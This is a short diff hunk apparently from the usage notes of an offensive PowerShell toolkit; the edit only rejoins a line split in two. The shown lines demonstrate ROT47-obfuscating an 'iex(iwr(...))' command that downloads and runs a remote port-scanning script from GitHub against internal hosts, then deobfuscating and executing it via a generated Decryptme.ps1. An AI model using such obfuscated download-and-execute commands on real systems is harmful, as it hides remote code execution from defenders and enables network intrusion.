@@ -176,8 +176,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String
 .\Decryptme.ps1
 
 #Obfuscate the IEX(IWR('')) -Text 'string' and create the decryptme.ps1 that deobfuscate\execute the -text 'string' if executed ..
-.\Convert-ROT47.ps1 -Text "iex(iwr('https://raw.githubusercontent.com/samratashok/nishang/master/Scan/Invoke-PortScan.ps1'));Invoke-PortScan -StartAddress '192.168.1.250' -EndAddress '192.168.1.254' -ResolveHost -ScanPort" -Rot
- "7" -Action "decryptme" -Encrypt
+.\Convert-ROT47.ps1 -Text "iex(iwr('https://raw.githubusercontent.com/samratashok/nishang/master/Scan/Invoke-PortScan.ps1'));Invoke-PortScan -StartAddress '192.168.1.250' -EndAddress '192.168.1.254' -ResolveHost -ScanPort" -Rot "7" -Action "decryptme" -Encrypt
  .\Decryptme.ps1
 ```
 
